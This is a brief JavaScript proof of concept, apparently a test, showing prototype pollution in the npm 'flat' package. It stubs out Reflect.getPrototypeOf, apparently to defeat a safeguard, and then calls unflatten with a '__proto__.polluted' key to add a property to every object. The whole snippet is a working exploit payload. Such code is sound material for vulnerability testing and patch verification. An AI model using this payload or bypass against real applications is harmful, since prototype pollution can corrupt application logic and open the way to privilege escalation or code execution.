Reflect.getPrototypeOf = () => false;
var unflatten = require('flat').unflatten;
console.log({}.polluted);
unflatten({ '__proto__.polluted': 'yes' });
console.log({}.polluted);